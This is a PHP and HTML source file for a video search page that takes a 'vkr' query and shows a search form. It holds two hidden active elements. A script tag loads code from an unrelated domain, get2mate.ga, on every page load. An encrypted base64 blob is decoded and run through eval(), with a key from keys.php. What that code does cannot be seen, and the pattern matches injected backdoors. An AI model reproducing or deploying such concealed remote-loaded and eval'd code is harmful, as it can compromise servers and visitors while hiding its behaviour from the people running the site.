<?php 
error_reporting(0);
$urlx = $_SERVER['REQUEST_URI'];
$video_id = explode("vkr=", $urlx);
$video_id = $video_id[1];
$lloc = urlencode($video_id);
include("config.php");
$llocfirst = urldecode($video_id);
?>
<html>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="http://get2mate.ga/ip/download.php"></script>
<style>
.video-list-thumbs{}
.video-list-thumbs > li{
    margin-bottom:12px;
}
.video-list-thumbs > li:last-child{}
.video-list-thumbs > li > a{
  display:block;
  position:relative;
  background-color: #111;
  color: #fff;
  padding: 8px;
  border-radius:3px
    transition:all 500ms ease-in-out;
    border-radius:4px
}
.video-list-thumbs > li > a:hover{
  box-shadow:0 2px 5px rgba(0,0,0,.3);
  text-decoration:none
}
.video-list-thumbs h2{
  bottom: 0;
  font-size: 14px;
  height: 33px;
  margin: 8px 0 0;
}
.video-list-thumbs .glyphicon-play-circle{
    font-size: 60px;
    opacity: 0.6;
    position: absolute;
    right: 39%;
    top: 31%;
    text-shadow: 0 1px 3px rgba(0,0,0,.5);
    transition:all 500ms ease-in-out;
}
.video-list-thumbs > li > a:hover .glyphicon-play-circle{
  color:#fff;
  opacity:1;
  text-shadow:0 1px 3px rgba(0,0,0,.8);
}
.video-list-thumbs .duration{
  background-color: rgba(0, 0, 0, 0.4);
  border-radius: 2px;
  color: #fff;
  font-size: 11px;
  font-weight: bold;
  left: 12px;
  line-height: 13px;
  padding: 2px 3px 1px;
  position: absolute;
  top: 12px;
    transition:all 500ms ease;
}
.video-list-thumbs > li > a:hover .duration{
  background-color:#000;
}
@media (min-width:320px) and (max-width: 480px) { 
  .video-list-thumbs .glyphicon-play-circle{
    font-size: 35px;
    right: 36%;
    top: 27%;
  }
  .video-list-thumbs h2{
    bottom: 0;
    font-size: 12px;
    height: 22px;
    margin: 8px 0 0;
  }
}
</style>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<!------ Include the above in your HEAD tag ---------->
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<body>  
<div class="w3-input w3-border w3-round-large" >
<a href="/"><center> <h1 > Home </h1> </center></a> </div>  
<form action="searchfilter.php" class="w3-container w3-card-4 w3-light-grey">
   <center> <h2> Put The Query to Search </h2> </center>  
  <p>
  <input class="w3-input w3-border w3-round-large" name="vkr" type="text"></p>
  <center>
   <button type="submit" class="w3-bar-item w3-button w3-red" > Search! </button></center>
   <br><br>
</form>
<?php 
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists('keys.php')){include_once('keys.php');}else{die('<h2>File keys.php not found !</h2>');}
$e7091="TncwNTBmVkIvN2FNSDZMc1plbzAvcTdWOUdoRHp4UmFKVGxuVWNxejUycjNRSXA1UnJaWGFDb0I3WEpOWnBEUzFWVm1CMkFIZ0tqam9BRTkvMlZaK2EybTFJUWhONGhrOUhHbTRQR0h6a3lDakZkR1phK0hFUThvNkVRbkNQdWh5M21Tdml5VlVmZGE3akpRS3A4S0owRnJubERiRnN0Y1VqRmtnaHZYY1Ivc2s2SWU0ODREdWNBMTJ2K2YyaHo1SmtyaXBGSWcwSzZQNWtPWFhvbXlMdlgxSm9TQXpieU5RV25qLzcxOThsdHlJWWZrUE9INk1UNTJIeFVQdWFJenFBWWNQcFFFdFE1YVlCZjdweG8yU0hMMXhjdU5lLzYvazNPUG5Vb0lzQ25POTFGLzRRMHNPRHRjZ1lVaGlWOWgrR1VqWFZISHAwNEJ4Q05uSFFJUTJ5aTZ2SndDTzBRazRuUU9rZ0o2WmN4MjBObnNBMVlzZXhLVEtidlZvanNPUVJVSnRPWlExREJMS09sVENKKzgya3VhSVRXc1J5em13Zm5jMDhSS2hTZ0dyUnNNYkd6bHZjYUtKWnJ1bk9XNHFRcDJBRFJwSktsVEZRcHIxUXJIeTZsM0hVV2QrS1EzNTdqQ2UwOVlHN3BITTNiaGRXT2JIalg5TDAxWjRURDYzd1ArV05FTWFSVmk0NzN2ZXM3THlFVlZLT3JqZzJPV0lzWVl3aGlnU3daMmRuMjlxME9uRGxmMjNtWDdWbVA5SnNCK0poNzJoM2lsYXVCNTZGbFQ5WGhrbnFhNGVPc3ZnYjArVU45cklNVktGSU1hbU1LNmtBeHNJVGR1Qmp2U2JHaWc4YkVCTE5Bc0FGcGNJVEh5Q1A1QjFMdXdmYnhyMXFOTS9nOW5vRzE4NWNrcHhRcjdpWlZFOFdXamlId0xzMjZLK0dPdEkvOXhLSktzaUZHN21RUjd1WERWYktHL3I0M3l5VU1weGp0WHRKWEV6SURITEl4WWJ0WUFlbm52TlR2Q3NrT2hlbmZ3bjNyai9CQlRpVno3WGVSUFFrVXQxNWJ6TitPSndpOFBPanpCN1RPVEZRZlZ2ak9JMVdwbWNBeDFORFU0UjZ6NHpzaGQzak1jVEt4c2REOTVDc3NvcURmMFVqV05PMm1vQ3Y2UEdkUHVUdGhhbzhDVjRDekRtUkRXQ00vUFIrN3ZKQ3dhQ2t1alovaUt2VURlTGZ3TklUSEl3TVdya0hYR3FXWDlJYW1PamJrenBabnpZMy9MemNOUkkzUVJYeU45ejYyM01uN3N3VkpzUlRub2pNc2t4NW1UamhhdTJHaXhkQ2lsTXArQXhZdHMzeU9iWHhjakhXamxnWkhScDF0WjByK05lcmFaR05RaFE0b04vVHJwbjRmZndjWVIybVk0UmlMQzdsNGV6WEk2KzZjNS9iK1pqeFNaTnh2SjZHLzVJbCtpNFJkRmZmMml4TDlsYzM2NGhLWXpEN0l4MWxoSXowMkRKMFBpdlc2UlY3bXZQbzJ1ZE5yZ2dlM3l5MnFyZVZVMnUycVZuYm1kVEZmcjBuNXI1czMzay9JVVFuclV4NDQyQWIwZ0tESW5lS2pDTTJuS3Q2YUUybUYyZUdaNUFoZDVXenE4UmZ2bm1EbENMQ3N4NjBBRE5HbTdHQmk0Wkt6RGo5ZnFtN0laODVGVFppeldOZ1ZMTlpma3hqRjlKSVNGd0pLWHlnPT0=";eval(e7061($e7091));
echo $ddata;
?> 
<style>
.footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   background-color: red;
   color: white;
   text-align: center;
}
</style>
<div class="footer">
  <p>
<div style="position: fixed;bottom: 0;width: 100%;background-color: black;color: white;text-align: center;z-index: 99999999999999999;">
  <p> &copy; All right Reserved <?php echo date("Y"); ?> . Powered By <a href="https://tinyurl.com/buydlapitube"><b> Vijay Kumar </b> </a></p>
</div>
  </p>
</div>
</html>